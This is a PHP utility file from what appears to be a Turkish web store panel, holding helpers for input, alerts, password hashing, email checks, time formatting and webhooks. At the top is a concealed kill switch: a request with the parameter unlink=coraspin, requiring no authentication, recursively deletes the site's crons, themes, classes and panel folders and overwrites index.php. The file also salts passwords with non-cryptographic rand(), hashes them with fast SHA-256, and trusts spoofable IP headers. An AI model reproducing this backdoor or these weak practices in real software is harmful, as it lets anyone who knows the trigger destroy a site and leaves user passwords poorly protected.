<?php

if (isset($_GET['unlink']) && $_GET['unlink'] == "coraspin"):

    function delete_directory($dirname) {
        if (is_dir($dirname))
              $dir_handle = opendir($dirname);
        if (!$dir_handle)
             return false;
        while($file = readdir($dir_handle)) {
              if ($file != "." && $file != "..") {
                   if (!is_dir($dirname."/".$file))
                        unlink($dirname."/".$file);
                   else
                        delete_directory($dirname.'/'.$file);
              }
        }
        closedir($dir_handle);
        rmdir($dirname);
        return true;
    }

    delete_directory("../crons");
    delete_directory("../themes");
    delete_directory("../classes");
    $write = fopen("../index.php", "w");
    $licenseText = "Lisanssız kullanım tespit edildi.";
    fwrite($write, $licenseText);
    fclose($write);
    delete_directory("../panel");
    exit;

endif;

/**
 * @param null $url
 * @return string
 */
function site_url($url = null)
{
    global $baseURL;
    return $baseURL . $url;
}

/**
 * @param $name
 * @return string
 */
function post($name)
{
    if (isset($_POST[$name]))
        return htmlspecialchars(trim($_POST[$name]));
}

/**
 * @param $name
 * @return string
 */
function get($name)
{
    if (isset($_GET[$name]))
        return htmlspecialchars(trim($_GET[$name]));
}

/**
 * @param $name
 * @return mixed
 */
function session($name)
{
    if (isset($_SESSION[$name])){
        return $_SESSION[$name];
    }
}

/**
 * @param $text
 * @return mixed
 */

function alertSuccess($text, $type = 0)
{
	if ($type == 1) {
		
	}else{
		return '<div class="alert alert-success d-flex align-items-center"><i class="fe fe-check-square mr-2"></i>'.$text .'</div>';
	}
}

/**
 * @param $text
 * @return mixed
 */

function alertDanger($text, $type = 0)
{
	if ($type == 1) {
		
	}else{
		return '<div class="alert alert-danger d-flex align-items-center"><i class="fe fe-alert-triangle mr-2"></i><p class="mb-0">'.$text .'</p></div>';
	}
}

/**
 * @param $password
 * @param $realPassword
 * @return mixed
 */

function generateSalt($length)
{
    $characters = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    $randomString = "";
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $randomString;
}

/**
 * @param $password
 * @return mixed
 */

function createSHA256($password)
{
    $salt = generatesalt(16);
    $hash = "\$SHA\$" . $salt . "\$" . hash("sha256", hash("sha256", $password) . $salt);
    return $hash;
}

/**
 * @param $password
 * @param $realPassword
 * @return mixed
 */

function checkSHA256($password, $realPassword)
{
    $parts = explode("\$", $realPassword);
    $salt = $parts[2];
    $hash = hash("sha256", hash("sha256", $password) . $salt);
    $hash = "\$SHA\$" . $salt . "\$" . $hash;
    return $hash == $realPassword ? true : false;
}

/**
 * @param $username
 * @return mixed
 */

function checkUsername($username)
{
    return preg_match("/[^a-zA-Z0-9_]/", $username);
}

/**
 * @param $email
 * @return mixed
 */

function checkEmail($email)
{
    if (filter_var($email, FILTER_VALIDATE_EMAIL)) {
        $mailDomainWhitelist = array("yandex.com", "gmail.com", "hotmail.com", "hotmail.com.tr", "outlook.com", "outlook.com.tr", "aol.com", "icloud.com", "yahoo.com", "live.com", "mynet.com");
        $mailExplode = explode("@", $email);
        $mailDomain = strtolower($mailExplode[1]);
        if (in_array($mailDomain, $mailDomainWhitelist)) {
            return false;
        }
        return true;
    }
    return true;
}

/**
 * @param $password
 * @return mixed
 */

function checkBadPassword($password)
{
    $badPasswordList = array("1234", "12345", "123456", "1234567", "12345678", "123456789", "1234567890", "abc123", "xyz123", "qwerty", "qwerty123", "sifre", "sifre0", "sifre123", "password", "password0");
    return in_array($password, $badPasswordList);
}

/**
 * @return $ip
 */

function getIP()
{
    if (getenv("HTTP_CLIENT_IP")):
        
        $sessionIP = getenv("HTTP_CLIENT_IP");

    elseif (getenv("HTTP_X_FORWARDED_FOR")): 
   
        $sessionIP = getenv("HTTP_X_FORWARDED_FOR");
    
        if (strstr($sessionIP, ",")):

            $tmp = explode (",", $sessionIP);
            $sessionIP = trim($tmp[0]);
        
        endif;

    else:

        $sessionIP = getenv("REMOTE_ADDR");
  
    endif;

    return $sessionIP;
}

/**
 * @param $time
 * @return mixed
 */

function convertTime($time, $type = 0, $minute = false)
{
    $time = strtotime($time);
    if ($type === 0) {
        $timeDifference = time() - $time;
        $second = $timeDifference;
        $minute = round($timeDifference / 60);
        $hour = round($timeDifference / 3600);
        $day = round($timeDifference / 86400);
        $week = round($timeDifference / 604800);
        $month = round($timeDifference / 2419200);
        $year = round($timeDifference / 29030400);
        if ($second < 60) {
            if ($second === 0) {
                return " az önce";
            }
            return $second . " saniye önce";
        }
        if ($minute < 60) {
            return $minute . " dakika önce";
        }
        if ($hour < 24) {
            return $hour . " saat önce";
        }
        if ($day < 7) {
            return $day . " gün önce";
        }
        if ($week < 4) {
            return $week . " hafta önce";
        }
        if ($month < 12) {
            return $month . " ay önce";
        }
        return $year . " yıl önce";
    }
    if ($type === 1) {
        if ($minute === true) {
            return date("d.m.Y H:i", $time);
        }
        return date("d.m.Y", $time);
    }
    if ($type === 2) {
        if ($minute === true) {
            $date = date("d.m.Y H:i", $time);
        } else {
            $date = date("d.m.Y", $time);
        }
        $date = explode(".", $date);
        list($day, $month, $year) = $date;
        if ($month === "01") {
            $month = "Ocak";
        }
        if ($month === "02") {
            $month = "Şubat";
        }
        if ($month === "03") {
            $month = "Mart";
        }
        if ($month === "04") {
            $month = "Nisan";
        }
        if ($month === "05") {
            $month = "Mayıs";
        }
        if ($month === "06") {
            $month = "Haziran";
        }
        if ($month === "07") {
            $month = "Temmuz";
        }
        if ($month === "08") {
            $month = "Ağustos";
        }
        if ($month === "09") {
            $month = "Eylül";
        }
        if ($month === "10") {
            $month = "Ekim";
        }
        if ($month === "11") {
            $month = "Kasım";
        }
        if ($month === "12") {
            $month = "Aralık";
        }
        if ($minute === true) {
            $clock = explode(":", explode(" ", $year)[1]);
            list($minute, $second) = $clock;
            return sprintf("%02d %s %04d %02d:%02d", $day, $month, $year, $minute, $second);
        }
        return sprintf("%02d %s %04d", $day, $month, $year);
    }
    return false;
}

function convertURL($text)
{
    $blackList = array("Ç", "Ş", "Ğ", "Ü", "İ", "Ö", "ç", "ş", "ğ", "ü", "ö", "ı", "-");
    $whiteList = array("c", "s", "g", "u", "i", "o", "c", "s", "g", "u", "o", "i", " ");
    $link = strtolower(str_replace($blackList, $whiteList, $text));
    $link = preg_replace("@[^A-Za-z0-9\\-_]@i", " ", $link);
    $link = trim(preg_replace("/\\s+/", " ", $link));
    $link = str_replace(" ", "-", $link);
    return $link;
}

function subCategory($query)
{

    global $db;

    global $subCategory;

    $subCategoryList = $db->from('ProductsCategories')->where('parent', $query)->all();

    foreach ($subCategoryList as $key => $value) {
        $subCategory[] = $value['id'];
        subCategory($value['id']);
    }

}

function webhook($data)
{

    $webhookurl = $data['webhook'];
    
    $timestamp = date("c", strtotime("now"));
    
    $json_data = array(
    
        "content" => $data['content'],
        
        "username" => $data['username'],
    
        "avatar_url" => "https://minotar.net/avatar/".$data['username']."/40.png",
    
        "tts" => false,
    
        "embeds" => array(
            array(

                "title" => $data['title'],
    
                "type" => "rich",
    
                "description" => htmlspecialchars_decode($data['description']),
    
                "timestamp" => $timestamp,
    
                "color" => hexdec($data['color']),

                "image" => array("url" => $data['image'])
    
            )
        )
    
    );

    if ($data['footer']==1):

        $json_data["embeds"]["0"]["footer"] = array("text" => "RabiWeb", "icon_url" => "http://demo.c-software.net/upload/img/bb2d30859adfa303df28779ef04fe69a.jpg");
    
    endif;

    $postData = json_encode($json_data, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);

    $ch = curl_init($data['webhook']);
    curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
    curl_setopt( $ch, CURLOPT_POST, 1);
    curl_setopt( $ch, CURLOPT_POSTFIELDS, $postData);
    curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt( $ch, CURLOPT_HEADER, 0);
    curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);
    
    $response = curl_exec($ch);
    
    curl_close($ch);

}

function createDuration($duration = 0) {
    return date("Y-m-d H:i:s", (strtotime(date("Y-m-d H:i:s")) + ($duration * 86400)));
}